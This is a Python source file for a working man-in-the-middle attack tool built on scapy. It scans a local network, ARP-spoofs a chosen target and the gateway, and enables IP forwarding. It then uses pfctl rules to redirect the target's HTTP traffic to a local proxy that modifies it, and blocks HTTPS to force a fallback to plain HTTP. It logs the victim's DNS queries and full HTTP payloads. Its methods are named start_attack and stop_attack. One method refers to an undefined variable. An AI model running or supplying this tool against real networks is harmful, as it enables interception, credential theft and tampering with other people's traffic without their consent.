import sys
import time
import socket
import threading
import os
import json
import urllib.request
from datetime import datetime
from proxy import TransparentProxy

from scapy.all import ARP, Ether, srp, send, sniff, IP, TCP, UDP, DNS, DNSQR, conf, get_if_list

# Disable verbose scapy
conf.verb = 0

class NetworkSniffer:
    def __init__(self):
        self.is_running = False
        self.packet_logs = []
        self.active_devices = []
        self.target_ip = None
        self.gateway_ip = None
        self.stop_event = threading.Event()
        self.sniff_thread = None
        self.spoof_thread = None
        self.interface = self.get_default_interface()
        self.last_log_content = None
        self.last_log_time = 0
        self.last_log_time = 0
        self.log_id_counter = 0 # Unique ID for logs
        self.log_id_counter = 0 # Unique ID for logs
        self.proxy = TransparentProxy(log_callback=self.add_proxy_log)
        self.redir_active = False
        self.block_https_active = False
        self.dns_cache = {} # Map IP -> Hostname
        print(f"[*] Using Interface: {self.interface}")

    def get_default_interface(self):
        """Try to find the active interface with internet."""
        try:
            # Connect to 8.8.8.8 to determine outgoing interface
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Find scapy interface that matches this IP
            for iface in get_if_list():
                try:
                    if conf.route.route("8.8.8.8", iface=iface)[1] == local_ip:
                         return iface
                except:
                    continue
            
            # Fallback for MacOS usually en0 (WiFi) or en1
            return conf.iface
        except Exception:
            return conf.iface

    def get_default_gateway(self):
        """Returns the default gateway IP."""
        try:
            return conf.route.route("0.0.0.0")[2]
        except Exception:
            return None

    def enable_ip_forwarding(self):
        """Enables IP forwarding on MacOS."""
        try:
            if os.name == 'posix':
                if sys.platform == 'darwin':
                     os.system("sysctl -w net.inet.ip.forwarding=1")
                else:
                     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except Exception as e:
            print(f"Error enabling IP forwarding: {e}")

    def enable_redirection(self, target_ip):
        """Redir Port 80 from Target to Local 8080 using pfctl"""
        self.redir_active = True
        self.apply_pf_rules(target_ip, self.redir_active, self.block_https_active)

    def set_https_block(self, target_ip, enabled):
        self.block_https_active = enabled
        self.apply_pf_rules(target_ip, self.redir_active, self.block_https_active)

        os.system(f"echo '{rule}' | sudo pfctl -Ef -")

    def enable_https_block(self, target_ip):
        """Blocks Port 443 from Target using pfctl to force HTTP fallback"""
        if sys.platform != 'darwin': return
        
        # Rule: Block TCP 443 from Target
        # Note: We need to append this to existing rules if redirection is active. 
        # For simplicity, we might flush and re-apply both if needed, or use multiple anchors.
        # But simple echo | pfctl -f - overwrites. 
        # Better approach: Combined rule generation or separate anchors (complex).
        # SIMPLEST MVP: Just overwrite with both if both active, or just block.
        # Let's assume we want Injection (Redir 80) AND Block 443.
        
        rule = f"block drop on {self.interface} proto tcp from {target_ip} to any port 443"
        print(f"[*] Enabling HTTPS Block: {rule}")
        
        # If redirection is ALSO active, we need both rules.
        # For now, let's just append this line.
        # Note: 'echo ... | pfctl -f -' replaces root rules.
        # We need a centralized rule manager in a real app, but here we'll just hack it.
        # We'll use a specific method `apply_pf_rules` to handle state.
        pass # see apply_rules update below

    def apply_pf_rules(self, target_ip, redirect_active=False, block_https_active=False):
        """Applies PF rules based on state."""
        if sys.platform != 'darwin': return
        
        rules = []
        if redirect_active:
            rules.append(f"rdr pass on {self.interface} proto tcp from {target_ip} to any port 80 -> 127.0.0.1 port 8080")
        
        if block_https_active:
             # 'block return' sends TCP RST (Connection Refused) immediately, 
             # instead of 'block drop' (Timeout). Faster failure encourages manual HTTP retry.
             rules.append(f"block return on {self.interface} proto tcp from {target_ip} to any port 443")
        
        if not rules:
            self.disable_redirection()
            return

        full_conf = "\n".join(rules)
        print(f"[*] Applying PF Rules:\n{full_conf}")
        os.system(f"echo '{full_conf}' | sudo pfctl -Ef -")

    def disable_redirection(self):
        """Flush PF rules"""
        if sys.platform != 'darwin': return
        print("[*] Flushing PF Rules")
        os.system("sudo pfctl -F all")

    def get_mac(self, ip):
        """Returns the MAC address of an IP."""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]

            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception as e:
            print(f"Error getting MAC for {ip}: {e}")
        return None
        
    def get_vendor(self, mac):
        """Fetches vendor from macvendors.co API."""
        try:
            url = f"https://macvendors.co/api/{mac}"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'API Browser')
            with urllib.request.urlopen(req, timeout=2) as response:
                data = json.loads(response.read().decode())
                return data['result']['company']
        except Exception:
            return "Unknown"

    def get_hostname(self, ip):
        """Resolves hostname from IP."""
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return "Unknown"

    def scan_network(self, subnet=None):
        """Scans the network for active devices."""
        if not subnet:
            # Auto-detect subnet based on local IP
            try:
                gateway = self.get_default_gateway()
                if gateway:
                     subnet = ".".join(gateway.split('.')[:3]) + ".1/24"
                else:
                     subnet = "192.168.1.1/24"
            except:
                subnet = "192.168.1.1/24"

        print(f"Scanning {subnet} on {self.interface}...")
        try:
            arp_request = ARP(pdst=subnet)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]

            self.active_devices = []
            for element in answered_list:
                ip = element[1].psrc
                mac = element[1].hwsrc
                vendor = self.get_vendor(mac)
                hostname = self.get_hostname(ip)
                
                client_dict = {
                    "ip": ip, 
                    "mac": mac,
                    "vendor": vendor,
                    "hostname": hostname
                }
                self.active_devices.append(client_dict)
        except Exception as e:
            print(f"Scan error: {e}")
        
        return self.active_devices

    def spoof(self, target_ip, spoof_ip):
        """Spoofs the ARP table."""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            return False

        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False, iface=self.interface)
        return True

    def restore(self, destination_ip, source_ip):
        """Restores the ARP table."""
        try:
            destination_mac = self.get_mac(destination_ip)
            source_mac = self.get_mac(source_ip)
            
            if destination_mac and source_mac:
                packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
                send(packet, count=4, verbose=False, iface=self.interface)
                print(f"[+] Restored ARP tables for {destination_ip}")
        except Exception as e:
            print(f"Error restoring ARP: {e}")

    def process_packet(self, packet):
        """Callback for scapy sniff."""
        log_entry = None
        timestamp = datetime.now().strftime("%H:%M:%S")
        current_time_epoch = time.time()

        # DEBUG: Print packet summary to terminal 
        # print(packet.summary()) # Uncomment if VERY confused

        if packet.haslayer(DNS):
            try:
                # A. DNS RESPONSE -> Update Cache
                if packet.ancount > 0:
                    for x in range(packet.ancount):
                        rr = packet[DNS].an[x]
                        if rr.type == 1: # A Record
                            try:
                                name = rr.rrname.decode('utf-8').strip('.')
                                ip = rr.rdata
                                self.dns_cache[ip] = name
                            except:
                                pass

                # B. DNS QUERY -> Log
                if packet.haslayer(DNSQR):
                    query = packet[DNSQR].qname.decode('utf-8').strip('.')
                    
                    # NOISE FILTER
                    if not (query.endswith('.local') or '_tcp' in query or '_udp' in query):
                        
                        details = f"DNS Query: {query}\n"
                        if packet.haslayer(IP):
                            details += f"Src: {packet[IP].src} -> Dst: {packet[IP].dst}\n"
                        details += packet.summary()

                        self.log_id_counter += 1
                        log_entry = {
                            "id": self.log_id_counter,
                            "type": "DNS", 
                            "content": query, 
                            "time": timestamp,
                            "details": details
                        }
                        
                        self.last_log_content = query
                        self.last_log_time = current_time_epoch

            except Exception:
                pass

                
        elif packet.haslayer(TCP) and packet.haslayer(IP):
            try:
                if packet[TCP].dport == 80:
                    payload = bytes(packet[TCP].payload)
                    if b"HTTP" in payload:
                        try:
                            # Try to decode the full payload for inspection
                            full_payload = payload.decode('utf-8', errors='replace')
                            
                            headers = payload.split(b"\r\n")
                            host = ""
                            path = ""
                            method = ""
                            
                            # Extract Method, Path, Host
                            first_line = headers[0].decode('utf-8', errors='ignore')
                            parts = first_line.split(' ')
                            if len(parts) > 1:
                                method = parts[0]
                                path = parts[1]
                                
                            for header in headers:
                                if b"Host:" in header:
                                    host = header.split(b"Host: ")[1].decode('utf-8', errors='ignore')
                            
                            if host:
                                url = f"{host}{path}"
                                full_url = f"http://{host}{path}"
                                
                                # Deduplication: DISABLED as per user request
                                # if url == self.last_log_content and (current_time_epoch - self.last_log_time) < 3.0:
                                #     return
                                    
                                # Build Detailed Report
                                details = f"=== HTTP REQUEST ===\n"
                                details += f"Timestamp: {timestamp}\n"
                                details += f"Method:    {method}\n"
                                details += f"URL:       {full_url}\n"
                                if packet.haslayer(IP):
                                    details += f"Source:    {packet[IP].src}\n"
                                    details += f"Dest:      {packet[IP].dst}\n"
                                details += f"\n--- RAW PAYLOAD ---\n"
                                details += full_payload

                                self.log_id_counter += 1
                                log_entry = {
                                    "id": self.log_id_counter,
                                    "type": "HTTP", 
                                    "content": url, 
                                    "time": timestamp,
                                    "details": details
                                }
                                # print(f"[HTTP] {url}")
                                
                                self.last_log_content = url
                                self.last_log_time = current_time_epoch
                        except Exception as e:
                            # print(f"Error parsing HTTP: {e}")
                            pass
                elif packet[TCP].dport == 443:
                     # HTTPS Traffic (Encrypted)
                     dst_ip = packet[IP].dst
                     
                     # 1. Resolve Hostname from Cache
                     hostname = self.dns_cache.get(dst_ip, dst_ip)
                     
                     content_str = f"Encrypted Traffic to {hostname}"
                     
                     # Deduplication
                     if current_time_epoch - self.last_log_time > 1.0 or self.last_log_content != f"HTTPS->{dst_ip}":
                         self.log_id_counter += 1
                         log_entry = {
                             "id": self.log_id_counter,
                             "type": "HTTPS",
                             "content": content_str,
                             "time": timestamp,
                             "details": f"Source: {packet[IP].src}\nDest: {dst_ip} ({hostname})\n\nCannot inspect: Encrypted (TLS)."
                         }
                         self.packet_logs.append(log_entry)
                         if len(self.packet_logs) > 1000:
                             self.packet_logs.pop(0)

                         self.last_log_content = f"HTTPS->{dst_ip}"
                         self.last_log_time = current_time_epoch

            except Exception:
                pass
        
        if log_entry:
            self.packet_logs.append(log_entry)
            if len(self.packet_logs) > 1000:
                self.packet_logs.pop(0)

    def add_proxy_log(self, type, content):
        """Callback for proxy logs."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_id_counter += 1
        log_entry = {
            "id": self.log_id_counter,
            "type": type,
            "content": content,
            "time": timestamp,
            "details": f"Automatically modified traffic for {content}"
        }
        self.packet_logs.append(log_entry)
        if len(self.packet_logs) > 1000:
             self.packet_logs.pop(0)

    def _spoof_loop(self):
        """Internal loop for ARP spoofing."""
        print("[*] Spoofer Thread Started")
        while not self.stop_event.is_set():
            self.spoof(self.target_ip, self.gateway_ip)
            self.spoof(self.gateway_ip, self.target_ip)
            time.sleep(1)
        print("[*] Spoofer Thread Stopped")

    def start_attack(self, target_ip, gateway_ip):
        """Starts the spoofing and sniffing threads."""
        if self.is_running:
            return False
        
        if not self.get_mac(target_ip):
            print(f"[-] Error: Could not find MAC for target {target_ip}")
            # We fail silently in API but log to console
            return False
            
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.stop_event.clear()
        self.packet_logs = [] 
        
        self.enable_ip_forwarding()

        # Start Proxy
        self.proxy.start()

        # Start Spoofer
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()

        # Start Sniffer
        def sniff_wrapper():
            print(f"[*] Sniffer Thread Started. Filtering for: ip host {self.target_ip}")
            try:
                sniff(filter=f"ip host {self.target_ip}", prn=self.process_packet, store=False, iface=self.interface, stop_filter=lambda x: self.stop_event.is_set())
            except Exception as e:
                print(f"Error in sniff: {e}")
            print("[*] Sniffer Thread Stopped")

        self.sniff_thread = threading.Thread(target=sniff_wrapper, daemon=True)
        self.sniff_thread.start()

        self.is_running = True
        return True

    def stop_attack(self):
        """Stops the attack and restores ARP tables."""
        if not self.is_running:
            return
            
        print("[*] Stopping Attack...")
        self.stop_event.set()
        
        self.disable_redirection() # Flush PF
        self.proxy.stop()
        
        # Wait for threads
        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        if self.sniff_thread:
            self.sniff_thread.join(timeout=3)
        
        if self.target_ip and self.gateway_ip:
            self.restore(self.target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, self.target_ip)
            
        self.is_running = False
        print("[*] Attack Stopped and Cleanup Done")
